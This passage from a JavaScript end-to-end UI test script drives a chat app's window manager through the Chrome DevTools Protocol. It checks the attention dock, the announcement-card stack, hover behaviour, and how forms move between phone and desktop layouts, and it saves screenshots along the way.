    await A.waitFor(`${J(all22)}.every((sid) => [...app.wm.windows.values()].some((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === sid))`, 12000); await sleep(1200);
    const KEYS22 = await A.evalJs(`${J(all22)}.map((sid) => { const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === sid); return (app.foryouRows.keysForWin(w.id) || [])[0] || null; })`);
    const four = (v) => KEYS22.map((key, k) => ({ ...ex22(`ut-r16cost${k + 1}`, T22 - (4 - k) * 1000), sessionKey: key, text: `Strip ${k + 1} asks ${v}?` }));
    await A.evalJs(PUSH22(J(four('once')))); await A.waitFor(`document.querySelectorAll('.chat-attn-dock:not([hidden]) .ut-item').length === 4`, 8000); await sleep(1500);
    await A.cdp('Performance.enable');
    const lc = async () => ((await A.cdp('Performance.getMetrics')).metrics.find((m) => m.name === 'LayoutCount') || {}).value;
    await A.evalJs(`(() => { const d = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'offsetHeight'); window.__ohD = d; window.__dockReads = 0; Object.defineProperty(HTMLElement.prototype, 'offsetHeight', { configurable: true, get() { if (this.classList && this.classList.contains('chat-attn-dock')) window.__dockReads++; return d.get.call(this); } }); return 1; })()`);
    const l0 = await lc();
    await A.evalJs(`(async () => { await (${PUSH22(J(four('again')))}); for (let k = 0; k < 4; k++) await new Promise((r) => requestAnimationFrame(r)); return 1; })()`);
    const l1 = await lc();
    const cost = await A.evalJs(`(() => { const n = window.__dockReads; Object.defineProperty(HTMLElement.prototype, 'offsetHeight', window.__ohD); delete window.__ohD; delete window.__dockReads; return { reads: n, reworded: [...document.querySelectorAll('.chat-attn-dock:not([hidden]) .ut-item .ut-text')].filter((e) => /asks again/.test(e.textContent)).length }; })()`);
    console.log(`    (㉒ e: four strips, one broadcast — the strips' layout reads ${cost.reads}, the page's layouts ${l1 - l0})`);
    check(`RED-able (r16 — 882665da7 read each strip's height before and after its pass): four open strips, one broadcast that rewords each (${cost.reworded} reworded) ⇒ the passes read NO strip's layout (${cost.reads} reads; the page laid out ${l1 - l0} times over the broadcast's frames)`, cost.reworded === 4 && cost.reads === 0, { cost, layouts: l1 - l0 });
    await A.evalJs(PUSH22('[]')); await sleep(600);
    // (g) r17 — HELD ⊆ FREE (the r16 acceptance: a 3×3 tiled grid — the free rule found no room and stood at its own place over the
    // composers; the mouse resting on the middle card folded the other two and the «N more» line): the stack's column tiled as a
    // 3×3 grid tiles it — three chats one above another at the right (their title bars' buttons soft, their composers hard)
    const TILE22 = (sid, k) => `(() => { const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === ${J(sid)}); if (!w) return 0; if (w.isMaximized) app.wm.toggleMaximize(w.id); const ws = app.wm.workspace.getBoundingClientRect(), W = Math.floor(ws.width / 3), H = Math.floor(ws.height / 3); app.wm.resizeWindowTo(w.id, { w: W, h: H }); w.element.style.left = (2 * W) + 'px'; w.element.style.top = (${k} * H) + 'px'; return 1; })()`;
    for (const [k, sid] of [s22, more22[0], more22[1]].entries()) await A.evalJs(TILE22(sid, k));
    await sleep(700);
    const GRID22 = `(() => { ${R22} const s = document.querySelector('.ut-announce'); if (!s) return null; const sr = R(s); const kids = [...s.children].filter((e) => !e.hidden && e.getClientRects().length).map((e) => ({ id: e.dataset.id || 'more', ...R(e) }));
      const inCol = (r) => !!r && r.l < sr.r && r.r > sr.l, all = (q) => [...document.querySelectorAll(q)].filter((e) => e.getClientRects().length).map(R).filter(inCol);
      return { stack: sr, kids, hard: all('.chat-input-area'), soft: all('.window-controls'), hover: s.matches(':hover'), counts: [...s.querySelectorAll('.uta-more-in')].filter((e) => !e.hidden).map((e) => e.textContent) }; })()`;
    const g3i = Array.from({ length: 3 }, (_, k) => ex22(`ut-r17grid${k + 1}`, T22 - (3 - k) * 1000));
    await A.evalJs(PUSH22(J(g3i))); await A.waitFor(`document.querySelectorAll('.ut-announce .uta-card').length === 3`, 8000); await sleep(1300); await A.evalJs(noToasts);
    const gFree = await A.evalJs(GRID22), gk = gFree && gFree.kids[1];
    if (gk) { await mouse((gk.l + gk.r) / 2, (gk.t + gk.b) / 2); await sleep(500); }
    await sleep(1600); await A.evalJs(noToasts); // (a tick of the stack's own clock, twice)
    const gHeld = await A.evalJs(GRID22);
    await A.shot('desktop-1280-held-grid.png');
    await mouse(40, 300); await sleep(700);
    const noRoom = !!gFree && gFree.kids.some((x) => gFree.hard.some((c) => meets(x, c))); // (the precondition: the free rule found no room — it stands over a composer)
    const kidsOf = (v) => (v ? v.kids.filter((x) => x.id !== 'more').map((x) => [x.id, x.t, x.b]) : null);
    check(`RED-able (r17 — e77f7a3f6: the mouse on the middle card folded the other two and the «N more» line): the stack's column tiled as a 3×3 grid tiles it (composers ${J(gFree && gFree.hard.map((c) => [c.t, c.b]))}, title bars' buttons ${J(gFree && gFree.soft.map((c) => [c.t, c.b]))}) — no room, the free rule's own place over them (${noRoom}); the mouse resting on the middle card, two ticks ⇒ all three stay where they were (${J(kidsOf(gHeld))}; free ${J(kidsOf(gFree))})`,
      noRoom && !!gHeld && gHeld.hover && J(kidsOf(gHeld)) === J(kidsOf(gFree)) && kidsOf(gHeld).length === 3, { gFree, gHeld });
    await A.evalJs(PUSH22('[]')); await sleep(500);
    await A.evalJs(PUSH22('d.todos.open')); await sleep(500);
    await A.evalJs(`(() => { for (const sid of ${J(more22)}) { const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === sid); if (w) app.wm.closeWindow(w.id); } return 1; })()`); await sleep(400);
    // (h) r18 — THE PINNED LINE KEEPS ITS RECTANGLE (the r17 acceptance's MAJOR: the mouse resting on «N more waiting — open For
    // you», the top card answered elsewhere — the refill took the line from under the mouse and the free placement then put the
    // oldest card there): four cards by the For-you button, the mouse on the line, the top one answered, two ticks; the mouse leaves
    await A.evalJs(`(() => { const w = ${CHATOF(s22)}; if (w) app.wm.closeWindow(w.id); return 1; })()`); await sleep(600);
    await A.evalJs(PUSH22('[]')); await A.waitFor(`!document.querySelector('.ut-announce .uta-card')`, 6000); await sleep(400);
    const l4 = Array.from({ length: 4 }, (_, k) => ex22(`ut-r18line${k + 1}`, T22 - (4 - k) * 1000));
    await A.evalJs(PUSH22(J(l4))); await A.waitFor(`document.querySelectorAll('.ut-announce .uta-card').length === 4`, 8000); await sleep(1300); await A.evalJs(noToasts);
    const LINE22 = `(() => { const m = document.querySelector('.ut-announce > .uta-more'); return m && !m.hidden && m.getClientRects().length ? m.textContent : null; })()`;
    const lFree = await A.evalJs(STK), lAt = lFree && lFree.kids.find((x) => x.id === 'more'), lY = lAt ? (lAt.t + lAt.b) / 2 : 0;
    if (lAt) { await mouse((lAt.l + lAt.r) / 2, lY); await sleep(500); }
    await A.evalJs(PUSH22(J(l4.slice(0, 3)))); await sleep(1600); await A.evalJs(noToasts); // (two ticks of the stack's own clock after it)
    const lHeld = await A.evalJs(STK), lSaid = await A.evalJs(LINE22), lUnder = lHeld ? lHeld.kids.find((x) => x.t <= lY && x.b >= lY) : null;
    await A.shot('desktop-1280-held-line.png');
    await mouse(40, 300); await sleep(700);
    const lAfter = await A.evalJs(STK), lNow = lHeld && lHeld.kids.find((x) => x.id === 'more');
    check(`RED-able (r18 — 34ebfcb93: the refill took the line from under the mouse, then the oldest card stood there): the mouse resting on «N more waiting» (${J(lAt)}), the top card answered elsewhere, two ticks ⇒ the line stays where it was read (${J(lNow)}) saying «${lSaid}», under the mouse ${lUnder && lUnder.id}; the mouse leaves ⇒ the stack refills (${J(lAfter && lAfter.kids.map((x) => x.id))})`,
      !!lAt && !!lHeld && lHeld.hover && sameR(lAt, lNow) && /\b1\b/.test(lSaid || '') && !!lUnder && lUnder.id === 'more' && !lHeld.kids.some((x) => x.id === 'ut-r18line4')
        && !!lAfter && !lAfter.hover && lAfter.kids.length === 3 && !lAfter.kids.some((x) => x.id === 'more') && lAfter.kids.some((x) => x.id === 'ut-r18line1'), { lFree, lHeld, lSaid, lAfter });
    // (i) r19 — THE WINDOW LAYER ASKS THE STACK AT ONCE (.367: test-automation-keys-chrome ⑫'s class — between two 1 s ticks the
    // stack stood over a form whose window had moved, grown or been raised under it): three cards by the For-you button; a FORM
    // (the app's own createModalShell kind 'form', through a plugin's dialog door) opens centred; 400 ms later — past the open's
    // own asks — its window is moved under the stack (as a drag, or its host's fit after its list opened, moves it): the stack
    // steps aside at once and a real click 200 ms later lands on the form; a window raised over the form ⇒ the stack back; the
    // form raised again ⇒ aside at once, a click 200 ms later on the form
    await A.evalJs(PUSH22('[]')); await A.waitFor(`!document.querySelector('.ut-announce .uta-card')`, 6000); await sleep(400);
    const i3 = Array.from({ length: 3 }, (_, k) => ex22(`ut-r19form${k + 1}`, T22 - (3 - k) * 1000));
    await A.evalJs(PUSH22(J(i3))); await A.waitFor(`document.querySelectorAll('.ut-announce .uta-card').length === 3`, 8000); await sleep(1300); await A.evalJs(noToasts);
    await mouse(40, 300);
    const API19 = `(window.__r19Api ||= app.pluginClient._hostApi({ id: 'r19probe', version: '1' }, new AbortController()))`;
    const OPEN19 = (id, label, w, h) => `{ const sh = ${API19}.createModalShell({ id: ${J(id)}, title: ${J(label)}, kind: 'form', escapeToClose: true }); sh.body.innerHTML = '<button type="button" class="r19-hit" style="display:block;width:${w}px;height:${h}px">' + ${J(label)} + '</button>'; window.__r19Hits = window.__r19Hits || {}; window.__r19Hits[${J(id)}] = 0; sh.body.querySelector('.r19-hit').addEventListener('click', () => { window.__r19Hits[${J(id)}]++; }); (window.__r19Shells ||= {})[${J(id)}] = sh; }`;
    const FORM19 = (id, label, w, h) => `(() => { ${OPEN19(id, label, w, h)} return true; })()`;
    await A.evalJs(FORM19('under', 'A form under the stack', 420, 240)); await sleep(400);
    const VIS19 = `(() => { const s = document.querySelector('.ut-announce'); return s ? { vis: s.style.visibility, cards: s.querySelectorAll('.uta-card').length } : null; })()`;
    const moved = await A.evalJs(`(() => { ${R22} const s = document.querySelector('.ut-announce'), f = document.getElementById('plugin-r19probe-under'), w = f && f.closest('.window'), ws = document.getElementById('workspace').getBoundingClientRect(); if (!s || !w) return null;
      const sr = s.getBoundingClientRect(); w.style.left = Math.round(sr.left - ws.left - 30) + 'px'; w.style.top = Math.round(sr.top - ws.top - 40) + 'px'; return { stack: R(s), win: R(w) }; })()`);
    const iNow = await A.evalJs(VIS19);
    await sleep(200);
    const iAt = await A.evalJs(`(() => { const s = document.querySelector('.ut-announce'), b = document.querySelector('#plugin-r19probe-under .r19-hit'); if (!s || !b) return null; const sr = s.getBoundingClientRect(), br = b.getBoundingClientRect(); const l = Math.max(sr.left, br.left), r = Math.min(sr.right, br.right), t = Math.max(sr.top, br.top), bt = Math.min(sr.bottom, br.bottom); return l < r && t < bt ? { x: Math.round((l + r) / 2), y: Math.round((t + bt) / 2) } : null; })()`);
    if (iAt) await A.clickAt(iAt.x, iAt.y);
    const iClick = await A.evalJs(`({ hits: (window.__r19Hits || {}).under || 0, ...(${VIS19} || {}) })`);
    // a window raised over the form (a plain one, no form in it) ⇒ the stack is back; the form raised ⇒ aside at once
    const cover = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-under'), fw = f && f.closest('.window'); const w = app.wm.createWindow({ title: 'r19 cover', type: 'form', width: 700, height: 520 }); const ws = document.getElementById('workspace').getBoundingClientRect(), r = fw.getBoundingClientRect(); w.element.style.left = Math.round(r.left - ws.left - 60) + 'px'; w.element.style.top = Math.round(r.top - ws.top - 60) + 'px'; window.__r19Cover = w.id; return w.id; })()`);
    await sleep(60); const iCovered = await A.evalJs(VIS19);
    await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-under'), fw = f && f.closest('.window'), w = [...app.wm.windows.values()].find((x) => x.element === fw); app.wm.focusWindow(w.id); return true; })()`);
    const iRaised = await A.evalJs(VIS19);
    await sleep(200);
    if (iAt) await A.clickAt(iAt.x, iAt.y);
    const iClick2 = await A.evalJs(`({ hits: (window.__r19Hits || {}).under || 0, ...(${VIS19} || {}) })`);
    await A.shot('desktop-1280-form-under-stack.png');
    check(`RED-able (r19 — 1c4261dcc asked only at its 1 s tick: the stack stayed over a form moved under it, a click landed on a card): a form window moved under the stack (${J(moved && moved.win)} under ${J(moved && moved.stack)}) ⇒ aside at once («${iNow && iNow.vis}»); a real click 200 ms later at ${J(iAt)} lands on the form (${iClick.hits}), the three cards kept (${iClick.cards}); a window raised over it ⇒ the stack back («${iCovered && iCovered.vis}»); the form raised ⇒ aside at once («${iRaised && iRaised.vis}»), a click 200 ms later on the form again (${iClick2.hits})`,
      !!moved && !!iAt && !!iNow && iNow.vis === 'hidden' && iClick.hits === 1 && iClick.cards === 3 && !!cover && !!iCovered && iCovered.vis === '' && !!iRaised && iRaised.vis === 'hidden' && iClick2.hits === 2 && iClick2.cards === 3, { moved, iAt, iNow, iClick, iCovered, iRaised, iClick2 });
    await A.evalJs(`(() => { try { app.wm.closeWindow(window.__r19Cover); } catch { } try { window.__r19Shells.under.close(); } catch { } return true; })()`); await sleep(300);
    // (j) r19 — THE FORM HOST'S CROSSING (a cross-fix in form-window.js — ⑫'s actual red): (j1) a phone-sized page (700 px, the
    // compact class, settled) goes back to 1280 and a form opens AT ONCE, inside the crossing's 120 ms settle ⇒ it stands as its
    // WINDOW (the open settles the crossing first), never a sheet that jumps into its window under the next press
    await A.evalJs(PUSH22('[]')); await sleep(300);
    await A.device(700, 800, { mouse: true }); await sleep(700);
    const j0 = await A.evalJs(`({ vc: document.documentElement.dataset.vc, isMobile: app.isMobile })`);
    await A.device(1280, 800, { mouse: true });
    const j1 = await A.evalJs(`(() => { const before = { vc: document.documentElement.dataset.vc, isMobile: app.isMobile, inner: innerWidth }; ${OPEN19('cross', 'Opened inside the crossing', 560, 120)} const f = document.getElementById('plugin-r19probe-cross'); return { before, sheet: !!f && f.classList.contains('form-sheet'), win: !!f && !!f.closest('.window'), after: { vc: document.documentElement.dataset.vc, isMobile: app.isMobile } }; })()`);
    await sleep(400);
    const j1b = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-cross'); return { sheet: !!f && f.classList.contains('form-sheet'), win: !!f && !!f.closest('.window'), vc: document.documentElement.dataset.vc }; })()`);
    check(`RED-able (r19 — 1c4261dcc read the phone's app.isMobile inside the settle: the form opened as a SHEET and jumped into its window 120 ms later): from the phone class (${J(j0)}) back to 1280 and a form opened at once (the page then ${J(j1 && j1.before)}) ⇒ it opens as its window (sheet ${j1 && j1.sheet}, window ${j1 && j1.win}; the class at the open: ${J(j1 && j1.after)}), and stays one, the page the desktop's (${J(j1b)})`,
      !!j0 && j0.isMobile === true && !!j1 && !j1.sheet && j1.win && !!j1b && j1b.win && !j1b.sheet && j1b.vc === 'desktop', { j0, j1, j1b });   // (r25: the class settles at the open only when the switch heard the crossing — either way the form is its window)
    // (j2) a re-host never moves a form under a press (r20: on the crossing's real road): on the phone tier (700 px) the form is
    // its sheet; a real press goes DOWN on its button and the viewport goes back to 1280 while it is down ⇒ the crossing waits (a
    // sheet still, the page still the phone's); the press UP — the pointer kept on its button through the re-layout — ⇒ the click lands on
    // it; then the crossing: the form in its window, the page the desktop's
    await A.device(700, 800, { mouse: true }); await sleep(800);
    const BTN20 = `(() => { const f = document.getElementById('plugin-r19probe-cross'), b = f && f.querySelector('.r19-hit'); if (!b) return null; const r = b.getBoundingClientRect(); return { sheet: f.classList.contains('form-sheet'), win: !!f.closest('.window'), vc: document.documentElement.dataset.vc, isMobile: app.isMobile, x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2) }; })()`;
    const jb = await A.evalJs(BTN20);
    let j2 = null;
    if (jb) {
      await mouse(jb.x, jb.y); await sleep(30);
      await A.cdp('Input.dispatchMouseEvent', { type: 'mousePressed', x: jb.x, y: jb.y, button: 'left', buttons: 1, clickCount: 1 }); await sleep(40);
      await A.device(1280, 800, { mouse: true }); await sleep(400);
      const held = await A.evalJs(BTN20);   // the page re-laid the sheet out at the new width — the press follows its button there (a drag inside it), the button still pressed
      if (held) { await A.cdp('Input.dispatchMouseEvent', { type: 'mouseMoved', x: held.x, y: held.y, button: 'left', buttons: 1 }); await sleep(30); }
      await A.cdp('Input.dispatchMouseEvent', { type: 'mouseReleased', x: held ? held.x : jb.x, y: held ? held.y : jb.y, button: 'left', buttons: 0, clickCount: 1 }); await sleep(60);
      const up = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-cross'); return { hits: (window.__r19Hits || {}).cross || 0, sheet: f.classList.contains('form-sheet') }; })()`);
      await sleep(700);
      const later = await A.evalJs(BTN20);
      j2 = { jb, held, up, later };
    }
    check(`a re-host never moves a form under a press (r19's (j2) on the crossing's real road): the sheet on the phone tier (${J(jb)}), a press DOWN on its button, the viewport back to 1280 while it is down ⇒ the crossing waits (${J(j2 && j2.held)}); the press UP (on its button, re-laid out at the new width) ⇒ the click lands on it (${J(j2 && j2.up)}); then its window on the desktop (${J(j2 && j2.later)})`,
      !!jb && jb.sheet && jb.vc === 'compact' && !!j2 && !!j2.held && j2.held.sheet && !j2.held.win && j2.held.vc === 'compact' && j2.up.hits === 1 && !!j2.later && j2.later.win && !j2.later.sheet && j2.later.vc === 'desktop', j2 || jb);
    // (j3) r20 — THE CROSSING WAITS AS ONE UNIT AND THE FORMS STILL GO FIRST (the r19 acceptance's MAJOR — b4271577f deferred the
    // forms alone: the phone's rules ran around the form window): the form a window on the desktop; a real press DOWN on the empty
    // workspace; the viewport goes to 700 px while it is down ⇒ nothing moves, no phone rule runs; the press UP ⇒ the crossing —
    // the form is its sheet BEFORE the phone's rules run (the sidebar's setPhoneMode counts the form windows it sees: none)
    await A.evalJs(`(() => { if (!app.sidebar.__r20) { const orig = app.sidebar.setPhoneMode.bind(app.sidebar); app.sidebar.setPhoneMode = (p) => { if (p) window.__r20Seen = [...app.wm.windows.values()].filter((w) => w.type === 'form').map((w) => w.element.dataset.form || w.id); return orig(p); }; app.sidebar.__r20 = 1; } window.__r20Seen = null; return true; })()`);
    const j3a = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-cross'); return { win: !!f && !!f.closest('.window'), vc: document.documentElement.dataset.vc }; })()`);
    await mouse(120, 620); await sleep(30);
    await A.cdp('Input.dispatchMouseEvent', { type: 'mousePressed', x: 120, y: 620, button: 'left', clickCount: 1 }); await sleep(40);
    await A.device(700, 800, { mouse: true }); await sleep(450);
    const j3h = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-cross'); return { win: !!f.closest('.window'), sheet: f.classList.contains('form-sheet'), vc: document.documentElement.dataset.vc, isMobile: app.isMobile, seen: window.__r20Seen }; })()`);
    await A.cdp('Input.dispatchMouseEvent', { type: 'mouseReleased', x: 120, y: 620, button: 'left', clickCount: 1 }); await sleep(800);
    const j3b = await A.evalJs(`(() => { const f = document.getElementById('plugin-r19probe-cross'); return { win: !!f.closest('.window'), sheet: f.classList.contains('form-sheet'), vc: document.documentElement.dataset.vc, isMobile: app.isMobile, seen: window.__r20Seen }; })()`);
    check(`RED-able (r20 — b4271577f: the phone's rules ran around the form window, «setPhoneMode sees form windows=w1»): a form window on the desktop (${J(j3a)}), a press DOWN, the viewport to 700 px while it is down ⇒ nothing moves and no phone rule runs (${J(j3h)}); the press UP ⇒ the crossing, the form its sheet first — the phone's setPhoneMode saw ${J(j3b.seen)} form windows (${J(j3b)})`,
      !!j3a && j3a.win && j3a.vc === 'desktop' && !!j3h && j3h.win && !j3h.sheet && j3h.vc === 'desktop' && j3h.seen === null && !!j3b && j3b.sheet && !j3b.win && j3b.vc === 'compact' && Array.isArray(j3b.seen) && j3b.seen.length === 0, { j3a, j3h, j3b });
    await A.device(1280, 800, { mouse: true }); await sleep(800);
    await A.evalJs(`(() => { try { window.__r19Shells.cross.close(); } catch { } return true; })()`); await sleep(300);
    await A.evalJs(PUSH22('d.todos.open')); await sleep(500);
  } catch (e) { fail++; console.log('  ✗ ㉒ threw: ' + (e?.message || e)); }
  lap('㉒ done');

  check('the shots are written (desktop 1280 + phone 390 / 375)', ['desktop-1280-tail.png', 'phone-390-tail.png', 'desktop-1280-dock-one.png', 'desktop-1280-dock-three.png', 'desktop-1280-dock-twenty.png', 'desktop-1280-dock-400-chars.png', 'desktop-1280-dock-six-options.png', 'desktop-320-dock.png', 'desktop-1280-dock-composer-6-lines.png', 'desktop-1280-dock-5000-up.png', 'phone-390-dock-two.png', 'phone-390-dock-twenty.png', 'phone-390-dock-six-options.png', 'desktop-1280-announce-one.png', 'desktop-1280-announce-ten.png', 'desktop-1280-announce-expired.png', 'desktop-1280-announce-two-windows.png', 'phone-390-announce.png', 'desktop-1280-reach-card.png', 'desktop-1280-dock-reach.png', 'desktop-1280-dock-reach-instance.png', 'phone-390-dock-reach.png', 'desktop-380-dock-reach.png', 'desktop-1280-announce-yields-tray.png', 'desktop-1280-announce-under-dialog.png', 'desktop-1280-announce-clear-composer.png', 'desktop-1280-dock-run.png', 'desktop-1280-announce-form-behind.png', 'phone-375-announce-over-home.png', 'phone-375-announce-under-tray.png', 'phone-375-dock-run.png', 'desktop-1280-dock-run-past.png', 'desktop-1280-dock-run-writable.png', 'desktop-1280-dock-run-again.png', 'desktop-1280-dock-run-many.png', 'desktop-700-dock-late.png', 'phone-375-dock-run-writable.png', 'desktop-1280-held-four.png', 'desktop-1280-held-five.png', 'desktop-1280-held-maxchat.png', 'desktop-1280-held-maxchat-five.png', 'desktop-dock-clock-rewrap.png', 'desktop-dock-resized.png', 'desktop-dock-592.png', 'desktop-dock-670.png', 'desktop-1280-held-grid.png', 'desktop-1280-held-line.png', 'desktop-1280-form-under-stack.png', 'desktop-1280-dock-run-manywarn.png', 'desktop-1280-dock-run-manyagain.png'].every((f) => fs.existsSync(path.join(SHOTS, f)))); // (+ lane needs-card-tail r10: the strip's and the announce's shots — the UI verdict is visual)
  check('no page error', pageErrors.length === 0, pageErrors.slice(0, 5));
} catch (e) { fail++; console.log('  ✗ threw: ' + (e?.stack || e)); }

console.log(`\nshots: ${SHOTS}`);
console.log(fail ? `\n${fail} FAILED (${pass} passed${skipped ? `, ${skipped} skipped` : ''})` : `\nALL PASS (${pass}${skipped ? `, ${skipped} skipped` : ''})`);
process.exit(fail ? 1 : 0);
